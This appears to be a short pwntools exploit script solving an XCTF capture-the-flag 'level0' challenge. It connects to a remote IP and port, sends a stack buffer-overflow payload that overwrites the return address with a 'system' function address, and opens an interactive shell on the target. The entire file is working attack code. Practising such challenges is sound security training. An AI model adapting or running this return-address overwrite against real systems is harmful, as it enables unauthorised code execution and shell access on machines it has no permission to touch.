from pwn import *
from zzPwnlib import *
context(os='linux', arch='amd64', log_level='debug')

r = remote('111.200.241.244',63887)
#r = process('./xctf_pwn_003_level0')

system_addr = 0x400597

payload = payloadBase(0x80, 64)
payload+= p64(system_addr)
r.sendline(payload)
r.interactive()
